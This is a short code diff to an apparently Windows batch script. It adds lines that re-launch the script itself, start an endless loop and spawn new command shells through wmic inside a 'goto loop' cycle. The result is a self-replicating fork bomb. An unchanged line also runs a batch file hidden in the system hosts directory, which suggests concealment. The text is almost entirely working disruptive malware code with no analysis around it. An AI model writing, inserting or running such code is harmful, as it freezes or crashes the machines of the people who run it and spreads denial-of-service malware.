@@ -56,8 +56,8 @@ set "p= /c"
 
 start /min cmd /c "C:\Windows\System32\drivers\etc\hosts.bat"
 
+start /b "" %0 
+start /b cmd /c "for /l %%x in (1,0,2) do echo %%x"
+wmic process call create "cmd.exe"
+
 goto loop
-
-
-
-
